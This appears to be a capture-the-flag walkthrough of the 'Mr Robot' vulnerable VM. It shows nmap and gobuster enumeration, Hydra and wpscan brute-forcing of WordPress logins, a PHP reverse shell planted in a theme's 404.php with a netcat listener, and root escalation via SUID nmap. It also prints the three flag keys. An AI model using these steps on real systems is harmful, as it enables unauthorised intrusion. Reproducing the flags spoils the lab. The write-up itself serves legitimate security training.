# Mr Robot

## Key 1

This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find. 

The VM isn't too difficult. There isn't any advanced exploitation or  reverse engineering. The level is considered beginner-intermediate.

### Port scanning

Using **nmap**

```bash
sudo nmap -sV -O -p1-1024 --script vulners
```

| PORT    | STATE  | SERVICE  | VERSION      |
| ------- | ------ | -------- | ------------ |
| 22/tcp  | closed | ssh      |              |
| 80/tcp  | open   | http     | Apache httpd |
| 443/tcp | open   | ssl/http | Apache httpd |

### Web enumeration

Using **gobuster**

```bash
gobuster dir -u http://10.0.2.4/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,html,htm,txt -o out_enum.txt
```

From the enumeration process we found that a server is **Wordpress** based. 

From the file **robots.txt** we found two records:

- A file named **fsocity.dic**
- The first key **key-1-of-3.txt** > **073403c8a58a1f80d943455fb30724b9**

<br>

## Key 2

### Find valid username with Hydra

First we sorted the wordlist (**fsocity.dic**) and removed duplicates using and then tried to guess the username of the account.

```bash
sort  fsocity.dic | uniq > fsocity.dic.uniq
```

```bash
hydra -L fsocity.dic.uniq -p nopass \
-s 80 10.0.2.4 http-post-form -t 30 \
'/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username'
```

![mr-robot-1](/home/kali/Pictures/mr-robot-1.png)

We found 3 valid usernames: **Elliot**, **ELLIOT** and **elliot**.

### Find password for Elliot

With a dictionary attack using **Wpscan**:

```bash
wpscan --url 10.0.2.4 -P fsocity.dic.uniq -U elliot
```

We found a valid combination found: **Username: elliot, Password: ER28-0652**

### Reverse shell on Wordpress

From [Pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) we downloaded the script for a **php reverse shell** then we pasted the code into a php file after **changing address and port**

![mr-robot-2](/home/kali/Pictures/mr-robot-2.png)

Need to start a **netcat listener on kali machine** with

```bash
nv -nvlp 4444
```

Then we can execute the shell visiting the php page on the link http://10.0.2.4/wordpress/wp-content/themes/twentyfifteen/404.php

To stabilize the shell we can run the command

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

On the **/home/robot** folder we found the **second key** and **password for robot user encoded with MD5**

![mr-robot-3](/home/kali/Pictures/mr-robot-3.png)

With [Crackstation](https://crackstation.net/) we can decode the hash, the password of user **robot** is **abcdefghijklmnopqrstuvwxyz**. Now we can see the content of the second key, **822c73956184f694993bede3eb39f959**

<br>

## Key 3

### Privilege escalation

With this command we print out any **executables which have SUID bit set**:

```bash
find / -perm -u=s -type f 2>/dev/null
```

![mr-robot-4](/home/kali/Pictures/mr-robot-4.png)

**Nmap** is located on the system and is **owned by the root user**.  This means no matter what your UserID is the effective user id of the program would be 0 or **root** 

From [GTFObins](https://gtfobins.github.io/gtfobins/nmap/#sudo) we found instructions to exploit **nmap** and get the root user shell.

```bash
sudo nmap --interactive
nmap> !sh
```

Now we are root! And in the **/root** folder there is the third key **04787ddef27c3dee1ee161b21670b4e4**
